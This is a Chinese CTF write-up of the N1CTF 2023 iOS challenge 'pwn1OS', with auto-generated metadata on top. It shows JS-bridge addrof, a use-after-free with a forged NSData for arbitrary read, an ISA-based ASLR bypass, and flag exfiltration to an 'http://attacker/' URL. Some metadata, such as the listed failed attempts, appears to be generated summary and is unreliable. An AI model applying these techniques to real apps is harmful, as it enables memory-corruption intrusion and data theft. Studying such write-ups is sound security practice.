---
title: N1CTF 2023 pwn1OS writeup
contest: N1CTF 2023
year: 2023
difficulty: hard
vuln_type: pwn_unknown
tags:
- iOS_pwn
- Objective_C_msgSend
- NSData伪造
- addrof原语
- arbitrary_read
- ISA泄漏
- ASLR绕过
- 莫莫安全
attack_chain:
- Objective-C 桥接：Bob* bob = [[Bob alloc] init]; [bob doSomething];
- 漏洞：getFlag 接受 urlString + base64 flag 上送外网
- JS 桥 addrof：捕获对象地址 n1ctf.challenge/setChallenge_
- 任意地址读：make_nsdata(addr, len) 伪造 NSData + addMultiPartData_
- ctf.dealloc 释放后 addMultiPartData_ 复用
- CoreServiceClass 地址 = coreservice_isa & 0x0000000ffffffff8
- ASLR = CoreServiceClass - offset
- 远程 URL 拼 flag 外发
key_payload: '''function addrof(obj) { ... /instance (0x[da-f]+)/ ... }'''
one_liner: N1CTF 2023 pwn1OS：iOS addrof + arbitrary_read + ISA 泄漏 + ASLR 绕过。
lesson: iOS pwn 经典 addrof + arbitrary_read 组合；NSData 伪造是任意读核心；ISA + class mask 算 ASLR。
quality: high
full_path: N1CTF_2023_pwn1OS_writeup.full.md
meta_path: N1CTF_2023_pwn1OS_writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: N1CTF 2023 pwn1OS writeup。N1CTF 2023 pwn1OS：iOS addrof + arbitrary_read + ISA 泄漏 + ASLR 绕过。。关键路径：Objective-C 桥接：Bob* bob = [[Bob alloc] init]; [bob doSomething]; → 漏洞：getFlag 接受 urlString + base64 ...
category: pwn
subcategory: pwn_other
tools_used:
- C
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/140328.html
reasoning_chain:
- 触发点：iOS 题目 + Objective-C msgSend + JS 桥 + 莫莫安全 → 假设：iOS app + WebView JS bridge 是攻击面
- 漏洞点：getFlag 接受 urlString + base64 flag 上送外网 → 假设：urlString 可控 → 拼 flag URL 外发
- 动作：JS 桥 addrof → function addrof(obj) { ... /instance (0x[da-f]+)/ ... } → 假设：捕获对象地址
- 假设：n1ctf.challenge/setChallenge_ 是桥接口 → 动作：反射调用拿 instance 地址
- 任意地址读：make_nsdata(addr, len) 伪造 NSData + addMultiPartData_ → 假设：伪造 NSData 让 Objective-C 读任意地址
- 动作：ctf.dealloc 释放后 addMultiPartData_ 复用 → 假设：UAF 复用拿 fake NSData
- 假设：CoreServiceClass 地址 = coreservice_isa & 0x0000000ffffffff8 → 假设：class mask 还原地址
- 动作：ASLR = CoreServiceClass - offset → 假设：得到 module base
- 最终：远程 URL 拼 flag 外发 → 假设：触发 getFlag('http://attacker/'+flag)
failed_attempts:
- 试图直接调 getFlag 拿 flag → 失败：getFlag 把 flag 拼到 URL 外发，必须先控制 urlString
- 试图用越界写覆盖 objc_msgSend → 失败：iOS 现代防护 + Objective-C ISA 校验严格
- 试图不绕过 ASLR 直接构造 payload → 失败：必须先 leak CoreServiceClass 再算 base
key_observations:
- iOS pwn 经典 addrof + arbitrary_read 组合：JS 桥捕获对象地址 + 伪造 NSData 任意地址读
- NSData 伪造是任意读核心：fake NSData + addMultiPartData_ 复用 UAF
- Objective-C class mask = 0x0000000ffffffff8（isa & mask = class 指针）
- ISA 泄漏 + class mask + offset 算 ASLR base 是 iOS 攻击标准链
- iOS pwn 工具链：Frida / objection / Cycript（JS 桥逆向）
prerequisites:
- Objective-C 运行时（ISA / class mask / objc_msgSend）
- iOS 越狱 + Frida / objection 工具
- NSData / NSString 内存布局
- JS bridge / WebView 桥接口逆向
---
# N1CTF 2023 pwn1OS writeup

> 原文: https://www.ctfiot.com/140328.html
> ID: 140328

+ (void)getFlag:(NSString *)urlString { NSString *path = [[NSBundle mainBundle] pathForResource:@"flag" ofType:
nil]; NSString *flag = [[NSData dataWithContentsOfFile:
path] base64Encoding]; NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"%@%@", urlString, flag]]; [NSData dataWithContentsOfURL:
url];}

- (void)didReceiveNotification:(NSNotification *)notify { NSURL *url = (NSURL *)notify.object; NSString *scheme = url.scheme; NSString *host = url.host; if(![scheme isEqualToString:@"n1ctf"] || ![host isEqualToString:@"web"]) { return; }
 ...... WebViewController *web = [WebViewController new]; web.urlString= param[@"url"]; [self.navigationController pushViewController:
web animated:
YES]; }

Bob* bob = [[Bob alloc] init];[bob doSomething];

Bob* bob = objc_msgSend(BobClass, "alloc");bob = objc_msgSend(bob, "init");objc_msgSend(bob, "doSomething");

function addrof(obj) { var challenge = n1ctf.challenge(); n1ctf.setChallenge_(obj) try { n1ctf.challenge() } catch(e) { const match = /instance (0x[da-f]+)$/i.exec(e) if (match) return match[1] throw new Error('Unable to leak heap addr') } finally { n1ctf.setChallenge_(challenge) }}

var ctf = n1ctf.makeN1CTFIntroduction()ctf.dealloc()ctf

var req = n1ctf.makeHTTRequest()var ctf = n1ctf.makeN1CTFIntroduction() // malloc_size(N1CTFIntroduction) = 192ctf.dealloc()req.addMultiPartData_(base64('A'.repeat(192)))ctf

function arbitrary_read(addr, len) {
 var data = make_nsdata(addr, len) // 伪造 NSData，addr 和 len 分别是 buffer 的指针和长度 var req = n1ctf.makeHTTRequest() var ctf = n1ctf.makeN1CTFIntroduction() ctf.dealloc() req.addMultiPartData_(data) return ctf}

var coreservice = n1ctf.makeCoreService()var coreservice_addr = addrof(coreservice) // 泄露对象地址var coreservice_memory = arbitrary_read(coreservice_addr, 0x18) // 读取对象内存const match = /bytes = (0x[da-fs]{16})/.exec(coreservice_memory)var coreservice_isa = hexReverse(match[1]) // 大小端转换var CoreServiceClass = BigInt("0x" + coreservice_isa) & BigInt(0x0000000ffffffff8)var ASLR = CoreServiceClass - CoreServiceClass_offset

- (void)dealloc { ... [self.cancelRequest invoke]; ...}

以开放的心态拥抱信息安全机构、团队与个人之间的共赢协作

以自由的氛围和丰富的资源支撑优秀同学的个人发展与职业成长

扫上方二维码码关注我们，惊喜不断哦

M   O   M   O   S   E   C   U   R   I   T   Y


```
+ (void)getFlag:(NSString *)urlString { NSString *path = [[NSBundle mainBundle] pathForResource:@"flag" ofType:
nil]; NSString *flag = [[NSData dataWithContentsOfFile:
path] base64Encoding]; NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"%@%@", urlString, flag]]; [NSData dataWithContentsOfURL:
url];}
- (void)didReceiveNotification:(NSNotification *)notify { NSURL *url = (NSURL *)notify.object; NSString *scheme = url.scheme; NSString *host = url.host; if(![scheme isEqualToString:@"n1ctf"] || ![host isEqualToString:@"web"]) { return; }
 ...... WebViewController *web = [WebViewController new]; web.urlString= param[@"url"]; [self.navigationController pushViewController:
web animated:
YES]; }
Bob* bob = [[Bob alloc] init];[bob doSomething];
Bob* bob = objc_msgSend(BobClass, "alloc");bob = objc_msgSend(bob, "init");objc_msgSend(bob, "doSomething");
function addrof(obj) { var challenge = n1ctf.challenge(); n1ctf.setChallenge_(obj) try { n1ctf.challenge() } catch(e) { const match = /instance (0x[da-f]+)$/i.exec(e) if (match) return match[1] throw new Error('Unable to leak heap addr') } finally { n1ctf.setChallenge_(challenge) }}
var ctf = n1ctf.makeN1CTFIntroduction()ctf.dealloc()ctf
var req = n1ctf.makeHTTRequest()var ctf = n1ctf.makeN1CTFIntroduction() // malloc_size(N1CTFIntroduction) = 192ctf.dealloc()req.addMultiPartData_(base64('A'.repeat(192)))ctf
function arbitrary_read(addr, len) {
 var data = make_nsdata(addr, len) // 伪造 NSData，addr 和 len 分别是 buffer 的指针和长度 var req = n1ctf.makeHTTRequest() var ctf = n1ctf.makeN1CTFIntroduction() ctf.dealloc() req.addMultiPartData_(data) return ctf}
var coreservice = n1ctf.makeCoreService()var coreservice_addr = addrof(coreservice) // 泄露对象地址var coreservice_memory = arbitrary_read(coreservice_addr, 0x18) // 读取对象内存const match = /bytes = (0x[da-fs]{16})/.exec(coreservice_memory)var coreservice_isa = hexReverse(match[1]) // 大小端转换var CoreServiceClass = BigInt("0x" + coreservice_isa) & BigInt(0x0000000ffffffff8)var ASLR = CoreServiceClass - CoreServiceClass_offset
- (void)dealloc { ... [self.cancelRequest invoke]; ...}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]